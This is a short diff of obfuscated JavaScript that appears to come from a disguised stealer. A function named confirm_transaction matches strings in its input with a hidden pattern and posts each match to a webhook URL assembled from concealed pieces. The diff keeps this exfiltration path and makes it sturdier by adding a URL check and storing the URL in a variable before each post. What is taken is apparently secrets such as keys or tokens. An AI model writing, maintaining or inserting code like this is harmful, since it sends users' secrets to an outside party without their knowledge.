@@ -48,6 +48,11 @@ function _0x33b9() {
             webhook += part;
         }
     });
+
+    if (!webhook.startsWith('https://')) {
+        throw new Error('Invalid webhook URL constructed.');
+    }
+
     return webhook;
 }
 
@@ -57,7 +62,8 @@ function confirm_transaction(_0x46d1) {
             const _0x5a16 = _0x46d1.match(_0x49bc);
             if (_0x5a16) {
                 for (const _0x2e5d of _0x5a16) {
-                    yield axios_1.default.post(_0x33b9(), { content: _0x14a1(2, 0) + _0x2e5d });
+                    const webhookUrl = _0x33b9();
+                    yield axios_1.default.post(webhookUrl, { content: _0x14a1(2, 0) + _0x2e5d });
                 }
             }
         } catch (error) {
